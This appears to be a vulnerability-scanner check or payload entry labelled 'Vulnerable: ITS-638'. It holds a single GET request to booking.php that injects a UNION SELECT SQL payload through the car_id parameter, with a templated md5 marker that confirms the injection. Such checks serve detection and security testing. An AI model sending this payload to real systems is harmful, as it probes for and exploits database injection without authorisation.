# Vulnerable: ITS-638
GET /booking.php?car_id=-1%20union%20select%201,md5({{num}}),3,4,5,6,7,8,9,10--+
